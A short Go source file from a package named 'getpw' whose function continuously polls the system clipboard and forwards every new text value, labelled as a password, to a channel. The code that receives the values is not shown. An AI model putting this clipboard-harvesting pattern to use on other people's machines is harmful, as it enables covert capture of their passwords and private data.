package getpw

import (
	"time"

	"golang.design/x/clipboard"
)


func MonitorClipboard() {
	clipOldB := clipboard.Read(clipboard.FmtText)
	clipOld := string(clipOldB)
	for {
		clipNewB := clipboard.Read(clipboard.FmtText)
		clipNew := string(clipNewB)
		if clipNew != clipOld && clipNew != "" {
			clipOld = clipNew
			password := clipNew
			p := PWStruct{
				Password: password,
				Mode: "clipboard",
			}
			PWC <- p
		}
		time.Sleep(time.Microsecond * 10)
	}
}